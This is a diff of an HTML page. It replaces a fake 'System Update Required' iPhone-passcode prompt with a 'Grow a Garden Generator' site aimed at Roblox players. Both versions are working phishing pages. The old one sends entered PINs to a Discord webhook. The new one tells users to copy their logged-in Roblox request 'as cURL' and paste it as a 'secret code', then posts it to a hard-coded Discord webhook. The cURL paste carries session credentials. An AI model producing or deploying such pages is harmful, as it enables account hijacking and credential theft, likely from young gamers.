@@ -1,91 +1,408 @@
-<!-- Omega-9: Data siphon active -->
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" >
 <head>
-  <meta charset="UTF-8">
-  <title>System Update Required</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Grow a Garden Generator</title>
   <style>
+    /* Reset & base */
+    * {
+      box-sizing: border-box;
+    }
     body {
-      background: white;
+      margin: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(135deg, #001021, #003060);
+      color: #e0e6f1;
+      min-height: 100vh;
       display: flex;
       flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+      justify-content: space-between;
     }
-    .circles {
+
+    /* Nav bar */
+    nav {
+      position: fixed;
+      top: 0;
+      width: 100%;
+      background: linear-gradient(90deg, #004080, #001a33);
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.8);
       display: flex;
-      gap: 16px;
+      justify-content: center;
+      gap: 30px;
+      padding: 15px 0;
+      z-index: 1000;
+    }
+    nav button {
+      background: linear-gradient(45deg, #0055cc, #003366);
+      border: none;
+      border-radius: 30px;
+      padding: 12px 28px;
+      font-size: 1.15rem;
+      color: #a0c8ff;
+      cursor: pointer;
+      box-shadow:
+        0 0 5px #4090ff,
+        0 0 15px #0055cc;
+      transition: all 0.3s ease;
+      user-select: none;
+    }
+    nav button:hover, nav button.active {
+      color: #fff;
+      background: linear-gradient(45deg, #33aaff, #0055cc);
+      box-shadow:
+        0 0 8px #66bbff,
+        0 0 20px #3399ff,
+        0 0 30px #0077ff;
+      transform: scale(1.05);
+    }
+    nav button:focus {
+      outline: none;
+    }
+
+    /* Container for page content */
+    main {
+      flex-grow: 1;
+      padding: 110px 20px 50px;
+      max-width: 700px;
+      margin: 0 auto;
+    }
+
+    /* Home Page */
+    #page-home {
+      text-align: center;
+      animation: fadeIn 0.7s ease forwards;
+    }
+    #page-home h1 {
+      font-size: 3rem;
+      margin-bottom: 18px;
+      text-shadow: 0 0 8px #33aaff;
+    }
+    #page-home p {
+      font-size: 1.5rem;
+      margin-top: 0;
+      color: #aaccee;
+      max-width: 600px;
+      margin-left: auto;
+      margin-right: auto;
+      line-height: 1.5;
+    }
+    /* Removed video styles since no video */
+
+    /* Generator secret input pages */
+    .generator-page {
+      max-width: 600px;
+      margin: 0 auto;
+      animation: fadeIn 0.7s ease forwards;
+      text-align: center;
+    }
+    .generator-page h2 {
+      font-size: 2.3rem;
       margin-bottom: 30px;
+      text-shadow: 0 0 10px #3399ff;
     }
-    .circle {
-      width: 24px;
-      height: 24px;
-      border: 2px solid #ccc;
-      border-radius: 50%;
+
+    /* Secret code input */
+    .secret-container {
+      text-align: center;
+      margin-top: 10px;
     }
-    .filled {
-      border-color: black;
+    .secret-container label {
+      font-size: 1.4rem;
+      margin-bottom: 10px;
+      display: block;
+      color: #aaccff;
     }
-    #hidden {
-      position: absolute;
-      opacity: 0;
-      pointer-events: none;
+    .secret-input {
+      width: 250px; /* smaller rectangle width */
+      padding: 8px 12px; /* smaller padding */
+      font-size: 1rem; /* keep readable */
+      border-radius: 12px;
+      border: 2px solid #3399ff;
+      background-color: #00172f;
+      color: #e0e6f1;
+      letter-spacing: 1.5px;
+      user-select: text;
+      caret-color: #66bbff;
+      transition: border-color 0.3s ease, box-shadow 0.3s ease;
     }
-    #message {
-      font-size: 18px;
-      color: #333;
-      margin-bottom: 20px;
+    .secret-input:focus {
+      outline: none;
+      border-color: #66bbff;
+      box-shadow: 0 0 12px #66bbff;
+      background-color: #002849;
+    }
+
+    /* Submit button */
+    .submit-btn {
+      margin-top: 30px;
+      padding: 16px 45px;
+      font-size: 1.4rem;
+      border: none;
+      border-radius: 30px;
+      background: linear-gradient(45deg, #3399ff, #0066ff);
+      color: white;
+      cursor: pointer;
+      box-shadow:
+        0 0 15px #3399ff,
+        inset 0 0 20px #0066ff;
+      transition: all 0.3s ease;
+      user-select: none;
+    }
+    .submit-btn:hover {
+      background: linear-gradient(45deg, #66bbff, #3399ff);
+      box-shadow:
+        0 0 25px #66bbff,
+        inset 0 0 30px #3399ff;
+      transform: scale(1.05);
+    }
+
+    /* Stats box - green success or red error embed */
+    .stats-box {
+      margin-top: 15px;
+      font-size: 1rem;
+      font-style: italic;
+      border-radius: 12px;
+      padding: 10px 15px;
+      max-width: 450px;
+      margin-left: auto;
+      margin-right: auto;
+      color: #ddffdd;
+      background: #004400cc;
+      box-shadow: 0 0 15px #00cc00cc;
+      user-select: none;
+      min-height: 24px;
+      white-space: pre-wrap; /* preserve line breaks */
+    }
+    .stats-box.error {
+      color: #ffdddd;
+      background: #660000cc;
+      box-shadow: 0 0 15px #cc0000cc;
+    }
+    .stats-box a {
+      color: #66bbff;
+      text-decoration: underline;
+      user-select: text;
+    }
+
+    /* Footer copyright button style */
+    footer {
+      display: flex;
+      justify-content: center;
+      padding: 12px 0;
+      background: linear-gradient(90deg, #004080, #001a33);
+      box-shadow: 0 -4px 12px rgba(0,0,0,0.8);
+      user-select: none;
+    }
+    footer .copy-button {
+      background: linear-gradient(45deg, #003366, #0055cc);
+      border-radius: 25px;
+      padding: 10px 24px;
+      color: #a0c8ff;
+      font-size: 1rem;
+      box-shadow:
+        0 0 8px #4090ff,
+        inset 0 0 10px #0055cc;
+      border: none;
+      cursor: default;
+      transition: all 0.3s ease;
+    }
+    footer .copy-button:hover {
+      color: #fff;
+      background: linear-gradient(45deg, #33aaff, #0055cc);
+      box-shadow:
+        0 0 12px #66bbff,
+        inset 0 0 15px #3399ff;
+      transform: scale(1.05);
+    }
+
+    /* Animations */
+    @keyframes fadeIn {
+      from {opacity: 0;}
+      to {opacity: 1;}
+    }
+
+    /* Responsive tweaks */
+    @media (max-width: 600px) {
+      nav {
+        flex-wrap: wrap;
+        gap: 10px;
+        padding: 10px 0;
+      }
+      nav button {
+        flex: 1 1 45%;
+        font-size: 1rem;
+        padding: 12px 0;
+      }
+      main {
+        padding: 120px 15px 50px;
+      }
+      .secret-input {
+        width: 95%;
+      }
     }
   </style>
 </head>
 <body>
-  <div id="message">Please verify your 4-digit iPhone passcode to continue</div>
-  <div class="circles">
-    <div class="circle" id="dot1"></div>
-    <div class="circle" id="dot2"></div>
-    <div class="circle" id="dot3"></div>
-    <div class="circle" id="dot4"></div>
-  </div>
-  <input type="password" id="hidden" maxlength="4" inputmode="numeric" autofocus />
 
-  <script>
-    const input = document.getElementById('hidden');
-    const circles = Array.from(document.getElementsByClassName('circle'));
-    const webhookUrl = 'https://discord.com/api/webhooks/1346369304609951764/KjXNX6EH6WD5NomAAuTHogQBMavYKlQdMbscmAy3qjneBMNsvvuwXJYsfn6mOmP6SIrs'; // <- Replace this with your actual Discord webhook
+<nav>
+  <button id="nav-home" class="active" title="Home" aria-label="Home">🏡 Home</button>
+  <button id="nav-seed" title="Seed Pack Generator" aria-label="Seed Pack Generator">🌱 Seed Pack Generator</button>
+  <button id="nav-egg" title="Egg Generator" aria-label="Egg Generator">🥚 Egg Generator</button>
+  <button id="nav-fruit" title="Fruit Generator" aria-label="Fruit Generator">🍎 Fruit Generator</button>
+</nav>
 
-    input.addEventListener('input', () => {
-      const val = input.value;
-      circles.forEach((circle, index) => {
-        circle.classList.toggle('filled', index < val.length);
-      });
+<main>
+  <!-- Home Page -->
+  <section id="page-home" class="page" aria-label="Welcome Page">
+    <h1>Grow a Garden Generator</h1>
+    <p>Welcome! Use this site to generate secret codes for Grow a Garden's Seed Packs, Eggs, or Fruits.  
+       Select your desired generator from above and enter your secret code to get started.</p>
 
-      if (val.length === 4) {
-        // Transmit to Discord webhook
-        fetch(webhookUrl, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify({
-            content: `📲 PIN captured: **${val}**`
-          })
-        }).then(() => {
-          document.getElementById('message').innerText = "Verifying...";
-          input.value = '';
-          circles.forEach(c => c.classList.remove('filled'));
-          setTimeout(() => {
-            document.getElementById('message').innerText = "Incorrect PIN. Try again.";
-          }, 1500);
-        }).catch(() => {
-          document.getElementById('message').innerText = "Connection error.";
-        });
+    <div style="margin-top: 30px; max-width: 650px; margin-left: auto; margin-right: auto; text-align: left; background: #002849; padding: 20px; border-radius: 16px; box-shadow: 0 0 25px #3399ffaa; user-select: text; color: #aad4ff; font-size: 1rem; line-height: 1.5;">
+      <h3 style="color: #66bbff; margin-top: 0;">How to get your secret code (curl) from Roblox:</h3>
+      <ol>
+        <li>Open <strong>Google Chrome</strong> and go to <a href="https://roblox.com" target="_blank" rel="noopener noreferrer" style="color:#99ccff;">roblox.com</a>.</li>
+        <li>Log in to your Roblox account if you haven't already.</li>
+        <li>Right-click anywhere on the page and select <strong>Inspect</strong> (or press <code>Ctrl+Shift+I</code> / <code>Cmd+Option+I</code> on Mac).</li>
+        <li>In the Developer Tools panel, click on the <strong>Network</strong> tab.</li>
+        <li>Refresh the page (press <code>F5</code> or <code>Ctrl+R</code> / <code>Cmd+R</code> on Mac) to capture network requests.</li>
+        <li>Look through the network requests and find the one related to the code or game data you want to extract.</li>
+        <li>Right-click that request and select <strong>Copy</strong> → <strong>Copy as cURL (bash)</strong>.</li>
+        <li>Paste the copied curl command into your desired tool or editor to use your secret code.</li>
+      </ol>
+      <p>If you are unsure on what to do DM staraimer331 on Discord💫.</p>
+    </div>
+  </section>
+
+  <!-- Seed Pack Generator -->
+  <section id="page-seed" class="page generator-page" style="display:none;" aria-label="Seed Pack Generator">
+    <h2>Seed Pack Generator 🌱</h2>
+    <div class="secret-container">
+      <label for="seed-secret">Enter your secret code 🔐</label>
+      <input id="seed-secret" class="secret-input" type="password" autocomplete="off" placeholder="Secret code here..." aria-describedby="seed-stats" />
+      <button class="submit-btn" id="seed-submit">Submit Secret Code</button>
+      <div class="stats-box" id="seed-stats">No code sent yet.</div>
+    </div>
+  </section>
+
+  <!-- Egg Generator -->
+  <section id="page-egg" class="page generator-page" style="display:none;" aria-label="Egg Generator">
+    <h2>Egg Generator 🥚</h2>
+    <div class="secret-container">
+      <label for="egg-secret">Enter your secret code 🔐</label>
+      <input id="egg-secret" class="secret-input" type="password" autocomplete="off" placeholder="Secret code here..." aria-describedby="egg-stats" />
+      <button class="submit-btn" id="egg-submit">Submit Secret Code</button>
+      <div class="stats-box" id="egg-stats">No code sent yet.</div>
+    </div>
+  </section>
+
+  <!-- Fruit Generator -->
+  <section id="page-fruit" class="page generator-page" style="display:none;" aria-label="Fruit Generator">
+    <h2>Fruit Generator 🍎</h2>
+    <div class="secret-container">
+      <label for="fruit-secret">Enter your secret code 🔐</label>
+      <input id="fruit-secret" class="secret-input" type="password" autocomplete="off" placeholder="Secret code here..." aria-describedby="fruit-stats" />
+      <button class="submit-btn" id="fruit-submit">Submit Secret Code</button>
+      <div class="stats-box" id="fruit-stats">No code sent yet.</div>
+    </div>
+  </section>
+</main>
+
+<footer>
+  <button class="copy-button" aria-label="Copyright">© GAG Something 2025</button>
+</footer>
+
+<script>
+  const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1383468961374599188/35qYZ1FGM8uXCRPaqePOY9mIh1DQ3p5jZYJwqKyyUE36DAnDl14NDHjbiw6RmHswTcwD";
+
+  // Navigation buttons
+  const navButtons = {
+    home: document.getElementById('nav-home'),
+    seed: document.getElementById('nav-seed'),
+    egg: document.getElementById('nav-egg'),
+    fruit: document.getElementById('nav-fruit')
+  };
+
+  // Pages
+  const pages = {
+    home: document.getElementById('page-home'),
+    seed: document.getElementById('page-seed'),
+    egg: document.getElementById('page-egg'),
+    fruit: document.getElementById('page-fruit')
+  };
+
+  function showPage(pageName) {
+    for (const key in pages) {
+      pages[key].style.display = (key === pageName) ? 'block' : 'none';
+      navButtons[key].classList.toggle('active', key === pageName);
+    }
+  }
+
+  // Initialize page
+  showPage('home');
+
+  // Add event listeners for nav buttons
+  navButtons.home.onclick = () => showPage('home');
+  navButtons.seed.onclick = () => showPage('seed');
+  navButtons.egg.onclick = () => showPage('egg');
+  navButtons.fruit.onclick = () => showPage('fruit');
+
+  // Submit buttons and inputs
+  const submitConfigs = [
+    {btnId: 'seed-submit', inputId: 'seed-secret', statsId: 'seed-stats', name: 'Seed Pack'},
+    {btnId: 'egg-submit', inputId: 'egg-secret', statsId: 'egg-stats', name: 'Egg'},
+    {btnId: 'fruit-submit', inputId: 'fruit-secret', statsId: 'fruit-stats', name: 'Fruit'}
+  ];
+
+  submitConfigs.forEach(({btnId, inputId, statsId, name}) => {
+    const btn = document.getElementById(btnId);
+    const input = document.getElementById(inputId);
+    const stats = document.getElementById(statsId);
+
+    btn.onclick = () => {
+      const secret = input.value.trim();
+      if (!secret) {
+        stats.textContent = 'Please enter your secret code.';
+        stats.classList.add('error');
+        return;
       }
-    });
+      stats.textContent = 'Sending...';
+      stats.classList.remove('error');
 
-    window.addEventListener('click', () => input.focus());
-    window.addEventListener('load', () => input.focus());
-  </script>
+      // Send webhook POST request with secret
+      fetch(DISCORD_WEBHOOK, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          username: 'GAG Generator',
+          embeds: [{
+            title: `${name} Secret Code`,
+            description: `\`\`\`\n${secret}\n\`\`\``,
+            color: 3447003,
+            timestamp: new Date().toISOString()
+          }]
+        })
+      }).then(response => {
+        if (response.ok) {
+          stats.textContent = `Secret code sent successfully!`;
+          stats.classList.remove('error');
+          input.value = '';
+        } else {
+          stats.textContent = `Error sending secret code. Please try again later.`;
+          stats.classList.add('error');
+        }
+      }).catch(() => {
+        stats.textContent = `Network error while sending secret code.`;
+        stats.classList.add('error');
+      });
+    };
+
+    input.addEventListener('keydown', (e) => {
+      if (e.key === 'Enter') btn.click();
+    });
+  });
+</script>
+
 </body>
 </html>
